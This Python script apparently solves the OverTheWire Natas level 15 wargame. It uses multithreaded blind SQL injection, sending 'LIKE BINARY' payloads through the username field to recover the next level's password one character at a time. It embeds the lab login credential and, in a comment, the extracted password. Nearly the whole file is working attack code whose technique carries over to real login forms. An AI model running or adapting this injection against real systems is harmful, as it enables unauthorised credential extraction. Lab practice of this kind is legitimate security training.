# Multithread -> Done
#import sys
from string import ascii_letters, digits
import os
from termcolor import colored
import pyperclip
from threading import Thread
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')



charset               = ascii_letters + digits
natas_login_username  = 'natas15'
natas_login_password  = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url                   = "http://natas15.natas.labs.overthewire.org/"
sqli                  = 'natas16" AND password LIKE BINARY "{}" -- -'

brower      = requests.Session()
brower.auth = (natas_login_username, natas_login_password)

hacked_password = ''
correct_status = 'This user exists'
def exploit(char):
    global hacked_password
    payload = sqli.format(hacked_password + char + '%')
    # print(payload)

    post_data = {
        'username': payload
    }

    res = brower.post(url, data=post_data)

    if correct_status in res.text:
        hacked_password += char
        print(payload)

while len(hacked_password) < 32:
    for char in charset:
        CHECK = len(hacked_password)
        if len(hacked_password) == CHECK:
            Thread(target=exploit, args={char}).start()
        else:
            break
    while len(hacked_password) == CHECK:
        pass


print('\n')
print(colored(hacked_password, 'red'))
# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

print('\n')
pyperclip.copy(hacked_password)
print(colored('Hacked password have been copy to clipboard', 'blue'))